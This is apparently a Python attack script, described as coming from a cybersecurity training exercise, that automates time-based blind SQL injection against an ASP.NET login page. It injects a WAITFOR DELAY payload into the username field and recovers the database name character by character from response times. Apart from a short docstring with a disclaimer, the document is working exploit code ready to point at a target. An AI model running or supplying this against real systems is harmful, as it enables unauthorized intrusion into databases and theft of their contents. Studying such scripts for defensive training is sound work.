"""
SQL Database Name Guesser

Description:
This Python script is designed to automate the process of guessing the name of a SQL database 
via time-based SQL injection vulnerabilities. It utilizes delay responses to infer the correct 
characters of the database name one at a time.

Usage:
- Capture POST request and save the header. 
- Ensure Python 3 and the 'requests' library are installed on your system.
- Update the 'url', 'headers', and 'data_template' variables in the script to match the target application's details. Remember to URL DECODE the __VIEWSTATE and __VIEWSTATEGENERATOR values as the script encodes them again.
- Run the script from the command line using: python3 sql_guesser.py
- The script will output the guessed characters of the database name as it progresses.
- 

Requirements:
- Python 3.x
- requests library (install with 'pip install requests')

Disclaimer:
This tool is intended for educational purposes and authorized security testing only. Always 
obtain permission before testing web applications or databases. Unauthorized use of this script 
and SQL injection testing can result in legal consequences and is against ethical guidelines.

Author: [oxgx]

Acknowledgments:
- This script was developed as part of a cybersecurity training exercise. It demonstrates concepts 
  essential for understanding and testing SQL injection vulnerabilities.

Notes:
- The effectiveness of this script depends on accurate initial configuration and may require 
  adjustments based on the application's specific behavior and protections.

"""
import requests
import string
import time

# Target application details
url = 'http://SQL_IP/login.aspx'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Referer': 'http://SQL_IP/login.aspx',
}

# The form data with placeholders for dynamic values
data_template = {
    '__VIEWSTATE': '/wEPD.................redacted.........................1IYQcQHCo8ynrhARlfl5UbI3eg==',
    '__VIEWSTATEGENERATOR': 'C2EE9ABB',
    '__EVENTVALIDATION': '/wEdAAR.................redacted.........................hH7vXEOCAeNyuD3vUIJp6KcTY2zCIrNyqx/7V0M=',
    'ctl00$ContentPlaceHolder1$UsernameTextBox': '',  # This will be updated with the payload
    'ctl00$ContentPlaceHolder1$PasswordTextBox': 'TEST',  # Static TEST value
    'ctl00$ContentPlaceHolder1$LoginButton': 'Login'
}

# Function to send the request and check for a delay indicating a successful condition
def check_condition(payload):
    start_time = time.time()
    data = data_template.copy()
    data['ctl00$ContentPlaceHolder1$UsernameTextBox'] = payload  # Injecting into UsernameTextBox
    response = requests.post(url, headers=headers, data=data)
    elapsed_time = time.time() - start_time
    # Adjust the delay check as per the actual conditions you observe
    return elapsed_time > 5

# Characters to test
chars = string.ascii_letters + string.digits
database_name = ''

# Assuming the database name has 6 letters as determined earlier
for position in range(1, 7):
    for char in chars:
        payload = f"'; IF (ASCII(SUBSTRING(DB_NAME(), {position}, 1)) = {ord(char)}) WAITFOR DELAY '00:00:05' --"
        print(f"Testing {char} at position {position}")
        if check_condition(payload):
            print(f"Found {char} at position {position}")
            database_name += char
            break  # Move to the next character position

print(f"Database name: {database_name}")
